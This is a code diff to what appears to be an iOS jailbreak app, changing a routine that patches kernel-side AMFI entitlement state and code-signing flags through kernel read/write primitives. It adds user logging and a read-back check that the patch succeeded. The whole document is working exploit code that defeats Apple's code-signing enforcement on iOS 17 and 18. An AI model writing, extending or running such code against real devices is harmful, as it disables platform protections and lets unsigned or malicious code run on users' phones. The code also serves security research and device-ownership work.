@@ -4,6 +4,7 @@
 #import "../kexploit/krw.h"
 #import "../kexploit/xpaci.h"
 #import "../kexploit/offsets.h"
+#import "../LogTextView.h"
 
 #import <dlfcn.h>
 #import <mach-o/loader.h>
@@ -97,11 +98,23 @@ static bool patch_state_flags(uint64_t state_kptr)
             printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state patched at 0x%llx\n", state_kptr);
         } else {
             printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state write failed — PPL/SPTM protected memory\n");
+            log_user("[AMFI][FAIL] Kernel rejected the state-flag write (PPL/SPTM protected). No success was recorded.\n");
+            return false;
         }
     } else {
         printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state already has desired flags\n");
     }
-    return true;
+
+    uint8_t verify[0x50] = {0};
+    kreadbuf(state_kptr, verify, sizeof(verify));
+    const struct AmfiStateFlags *verified = (const struct AmfiStateFlags *)&verify[0x48];
+    bool ok = verified->valid && verified->is_cs_platform && verified->has_transmuted;
+    log_user("[AMFI][VERIFY] valid=%u platform=%u transmuted=%u result=%s.\n",
+             verified->valid,
+             verified->is_cs_platform,
+             verified->has_transmuted,
+             ok ? "success" : "failed");
+    return ok;
 }
 
 // ---------------------------------------------------------------------------
@@ -131,20 +144,24 @@ static bool try_set_csflags(uint64_t proc)
 
 bool amfi_patch_proc(uint64_t proc)
 {
+    log_user("[AMFI][START] Testing AMFI state patch for proc=0x%llx.\n", proc);
     if (!proc) {
         printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid proc\n");
+        log_user("[AMFI][FAIL] Process pointer is unavailable.\n");
         return false;
     }
 
     uint64_t label = proc_get_cred_label(proc);
     if (!label) {
         printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get cred label\n");
+        log_user("[AMFI][FAIL] Could not resolve the process credential label.\n");
         return false;
     }
 
     uint64_t amfi_obj = amfi_cslot_get(label);
     if (!amfi_obj || !is_kaddr_valid(amfi_obj)) {
         printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get AMFI slot (amfi_obj=0x%llx)\n", amfi_obj);
+        log_user("[AMFI][FAIL] AMFI entitlement slot is missing or invalid (0x%llx).\n", amfi_obj);
         return false;
     }
 
@@ -158,6 +175,7 @@ bool amfi_patch_proc(uint64_t proc)
     if (!is_kaddr_valid(state_kptr)) {
         printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid state pointer: 0x%llx (after xpaci from ent.state=0x%llx)\n",
                state_kptr, (uint64_t)ent.state);
+        log_user("[AMFI][FAIL] Entitlement-state pointer failed validation.\n");
         return false;
     }
 
@@ -170,13 +188,21 @@ bool amfi_patch_proc(uint64_t proc)
     enum amfi_state_version ver = amfi_detect_version(header);
     printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state version: %s\n",
            ver == AMFI_STATE_IOS17 ? "iOS 17" : "iOS 18");
+    log_user("[AMFI][STATE] label=0x%llx slot=0x%llx state=0x%llx layout=%s.\n",
+             label, amfi_obj, state_kptr,
+             ver == AMFI_STATE_IOS17 ? "iOS 17" : "iOS 18+");
 
     // Patch the flag bytes
-    patch_state_flags(state_kptr);
+    bool patched = patch_state_flags(state_kptr);
+    if (!patched) {
+        log_user("[AMFI][END] Patch was not verified; treating this test as failed.\n");
+        return false;
+    }
 
     // Best-effort: try to touch other fields
     try_set_csflags(proc);
 
+    log_user("[AMFI][END] AMFI state patch verified for the current app process. Effect ends when this process exits.\n");
     return true;
 }
 
@@ -185,6 +211,7 @@ bool amfi_patch_self(void)
     uint64_t proc = proc_self();
     if (!proc) {
         printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to find self proc\n");
+        log_user("[AMFI][FAIL] Could not find infern0's process in the kernel process list.\n");
         return false;
     }
     printf("[" AMFI_BYPASS_EXPLOIT_NAME "] self proc at 0x%llx\n", proc);
